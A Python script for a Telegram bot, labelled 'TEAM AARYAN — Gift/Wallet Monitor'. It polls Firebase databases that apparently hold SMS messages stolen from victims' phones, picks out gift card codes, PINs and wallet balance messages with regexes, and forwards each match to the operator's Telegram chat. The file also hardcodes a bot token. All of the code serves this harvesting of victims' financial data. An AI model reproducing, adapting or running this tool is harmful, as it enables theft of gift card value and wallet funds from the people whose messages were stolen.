#!/usr/bin/env python3
"""
TEAM AARYAN — Gift/Wallet Monitor
Add Firebase from Telegram. Only valid ones stay. Invalid auto-removed.
Start/Stop. Only NEW after /start.
"""

import asyncio
import aiohttp
import re
import time
import json
import os
from datetime import datetime

TELEGRAM_BOT = "9278214158:AAGTlr3AKUArLLwhyGjmhnPiOFUDGLVnZZc"
TELEGRAM_CHAT = "8329680375"
STORE_FILE = "firebases.json"

POLL_SECONDS = 6
PARALLEL = 50

running = False
start_ts = 0
seen = set()
offset = 0
firebases = []  # list of [url, key]

def load_fb():
    global firebases
    if os.path.exists(STORE_FILE):
        try:
            with open(STORE_FILE) as f:
                firebases = json.load(f)
        except:
            firebases = []

def save_fb():
    with open(STORE_FILE, "w") as f:
        json.dump(firebases, f)

def parse_date(s):
    if not s: return 0
    m = re.search(r"(\d{1,2})[-/](\d{1,2})[-/](\d{4})\s*[|]?\s*(\d{1,2}):(\d{2})\s*(AM|PM)?", s, re.I)
    if m:
        day, mon, year = int(m.group(1)), int(m.group(2))-1, int(m.group(3))
        hh, mm = int(m.group(4)), int(m.group(5))
        ap = (m.group(6) or "").upper()
        if ap == "PM" and hh < 12: hh += 12
        if ap == "AM" and hh == 12: hh = 0
        try:
            return datetime(year, mon+1, day, hh, mm).timestamp()
        except:
            return 0
    try:
        return datetime.fromisoformat(s.replace("|", " ").strip()).timestamp()
    except:
        return 0

def is_real_gift(text):
    if not text: return False
    t = text.upper()
    gift = re.search(r"\b(AMAZON\.?IN|FLIPKART|GOOGLE PLAY|STEAM|ITUNES|APPLE|PAYTM|PHONEPE)\s*(GIFT\s*CARD|GIFT\s*VOUCHER)\b|\bGIFT\s*CARD\s*(ENDING|BALANCE|PIN|CODE)\b", t)
    if not gift: return False
    if re.search(r"OPEN A|ZERO BALANCE|MAKE DEBIT CARD|SPENDS OF|T&C APPLY|GET A RS", t) and not re.search(r"BALANCE RS|REMAINING BALANCE|PIN|CODE", t):
        return False
    return bool(re.search(r"BALANCE|REMAINING|PIN|CODE|REDEEM|ENDING WITH|EXPIRES", t))

def is_real_wallet(text):
    if not text: return False
    t = text.upper()
    if re.search(r"MOBIKWIK|MOBIKWIK WALLET|MKWALLET", t):
        if re.search(r"BALANCE|AVAILABLE|CREDITED|DEBITED|ADDED|LOADED|WALLET|RS\.?\s*[0-9]", t) and not re.search(r"RECHARGE NOW|PLAN EXPIRED|EXCLUSIVE OFFER", t):
            return True
    if re.search(r"\b(PHONEPE|AMAZON PAY)\b", t):
        if re.search(r"WALLET BALANCE|AVAILABLE BALANCE|BALANCE RS|CREDITED TO (YOUR )?(WALLET|PHONEPE|AMAZON PAY)|ADDED TO WALLET", t):
            return True
    return False

async def send_tg(session, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT}/sendMessage"
    try:
        await session.post(url, json={"chat_id": TELEGRAM_CHAT, "text": text, "parse_mode": "HTML"}, timeout=10)
    except:
        pass

async def fetch(session, url):
    try:
        async with session.get(url, timeout=12) as r:
            if r.status == 200:
                return await r.json()
            return None
    except:
        return None

async def validate_fb(session, url, key):
    base = url.rstrip("/")
    data = await fetch(session, f"{base}/clients.json?auth={key}")
    return data is not None

async def poll_telegram(session):
    global running, start_ts, offset, firebases
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT}/getUpdates"
    try:
        async with session.get(url, params={"offset": offset, "timeout": 5}, timeout=10) as r:
            data = await r.json()
            for u in data.get("result", []):
                offset = u["update_id"] + 1
                msg = u.get("message", {})
                text = (msg.get("text") or "").strip()
                chat = str(msg.get("chat", {}).get("id", ""))
                if chat != TELEGRAM_CHAT: continue
                low = text.lower()

                if low in ("/testart", "/start", "start"):
                    running = True
                    start_ts = time.time()
                    seen.clear()
                    await send_tg(session, "✅ <b>STARTED</b>\nMonitoring ON.\nAb se jo naya real gift card ya Mobikwik/PhonePe wallet aayega sirf woh bhejunga.\n/stop se band.")
                elif low in ("/stop", "stop"):
                    running = False
                    await send_tg(session, "⏹ <b>STOPPED</b>")
                elif low == "/status":
                    st = "RUNNING" if running else "STOPPED"
                    await send_tg(session, f"Status: {st}\nFirebases: {len(firebases)}")
                elif low.startswith("/add "):
                    parts = text.split(maxsplit=2)
                    if len(parts) < 3:
                        await send_tg(session, "Use: /add URL KEY")
                        continue
                    fb_url, fb_key = parts[1], parts[2]
                    ok = await validate_fb(session, fb_url, fb_key)
                    if ok:
                        if [fb_url, fb_key] not in firebases:
                            firebases.append([fb_url, fb_key])
                            save_fb()
                        await send_tg(session, f"✅ Added valid Firebase\n<code>{fb_url}</code>")
                    else:
                        await send_tg(session, f"❌ Invalid Firebase — not added\n<code>{fb_url}</code>")
                elif low == "/list":
                    if not firebases:
                        await send_tg(session, "No firebases")
                    else:
                        lines = [f"{i+1}. <code>{u}</code>" for i, (u, k) in enumerate(firebases)]
                        await send_tg(session, "Firebases:\n" + "\n".join(lines))
                elif low.startswith("/remove "):
                    try:
                        idx = int(text.split()[1]) - 1
                        if 0 <= idx < len(firebases):
                            removed = firebases.pop(idx)
                            save_fb()
                            await send_tg(session, f"Removed\n<code>{removed[0]}</code>")
                        else:
                            await send_tg(session, "Invalid number")
                    except:
                        await send_tg(session, "Use: /remove 1")
                elif low == "/clean":
                    valid = []
                    for u, k in firebases:
                        if await validate_fb(session, u, k):
                            valid.append([u, k])
                    removed = len(firebases) - len(valid)
                    firebases = valid
                    save_fb()
                    await send_tg(session, f"Cleaned. Removed {removed} invalid. Left: {len(firebases)}")
    except:
        pass

async def scan_one_fb(session, fb_url, fb_key):
    if not running: return []
    base = fb_url.rstrip("/")
    clients = await fetch(session, f"{base}/clients.json?auth={fb_key}")
    if clients is None:
        return "INVALID"
    if not clients: return []
    device_ids = list(clients.keys())
    new_items = []

    sem = asyncio.Semaphore(PARALLEL)
    async def one_device(did):
        async with sem:
            if not running: return
            msgs = await fetch(session, f"{base}/messages/{did}.json?auth={fb_key}")
            if not msgs: return
            for k, m in msgs.items():
                if not isinstance(m, dict): continue
                text = str(m.get("message") or m.get("body") or m.get("text") or "")
                if not text: continue
                tstr = str(m.get("dateTime") or m.get("date") or "")
                ts = parse_date(tstr)
                if ts and ts < start_ts: continue
                key = (fb_url, did, k)
                if key in seen: continue
                gift = is_real_gift(text)
                wallet = is_real_wallet(text)
                if gift or wallet:
                    seen.add(key)
                    new_items.append({
                        "device": did,
                        "text": text,
                        "time": tstr,
                        "gift": gift
                    })

    await asyncio.gather(*[one_device(d) for d in device_ids])
    return new_items

async def main():
    load_fb()
    print("Ready. Use /add URL KEY on Telegram.")
    async with aiohttp.ClientSession() as session:
        await send_tg(session, "Bot online.\n/add URL KEY\n/list\n/remove 1\n/clean\n/testart /stop")
        while True:
            await poll_telegram(session)
            if running and firebases:
                tasks = [scan_one_fb(session, u, k) for u, k in firebases]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                still_valid = []
                for i, res in enumerate(results):
                    if res == "INVALID":
                        await send_tg(session, f"❌ Removed invalid\n<code>{firebases[i][0]}</code>")
                    else:
                        still_valid.append(firebases[i])
                        if isinstance(res, list):
                            for item in res:
                                kind = "GIFT CARD" if item["gift"] else "WALLET"
                                msg = f"<b>NEW {kind}</b>\nDevice: <code>{item['device'][:16]}</code>\nTime: {item['time']}\n\n{item['text']}"
                                await send_tg(session, msg)
                if len(still_valid) != len(firebases):
                    firebases[:] = still_valid
                    save_fb()
            await asyncio.sleep(POLL_SECONDS)

if __name__ == "__main__":
    asyncio.run(main())
